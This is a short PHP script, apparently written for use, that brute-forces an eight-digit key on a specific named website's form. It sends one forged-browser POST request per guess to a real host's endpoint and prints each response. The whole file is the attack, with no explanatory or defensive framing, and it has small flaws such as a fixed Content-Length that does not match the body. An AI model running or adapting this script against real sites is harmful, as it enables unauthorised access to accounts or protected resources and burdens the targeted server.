<?php


	for ($i=11111111;$i<99999999;$i++)
	{
//$data=urlencode($data);

			$fp = fsockopen("andreys.16mb.com", 80, $errno, $errstr, 30);
			if (!$fp) {
			    echo "$errstr ($errno)<br />\n";
			} else {
			    $out = "POST /f/index2.php HTTP/1.0\r\n";
			    $out .= "Host: andreys.16mb.com\r\n";

			    $out .= "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0\r\n";
			    $out .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
			    $out .= "Accept-Language: en-US,en;q=0.5\r\n";
			    $out .= "Accept-Encoding: gzip, deflate\r\n";
			    $out .= "Referer: http://andreys.16mb.com/f/index.php\r\n";
			    $out .= "Content-Type: application/x-www-form-urlencoded\r\n";
			    $out .= "Content-Length: 19\r\n";

			    $out .= "Connection: keep-alive\r\n";
			    $out .= "Pragma: no-cache\r\n";
			    $out .= "Cache-Control: no-cache\r\n";
			    $out .= "Connection: Close\r\n\r\n";




				    $data="id=4&key=".$i."\r\n";
				    fwrite($fp, $out); 
				    fwrite($fp, $data);

				   // echo $out;

				    while (!feof($fp)) {
					echo fgets($fp, 1024);
				    }
					echo $i."/n/r";

				}
		 fclose($fp);

	}
	   
 
?>

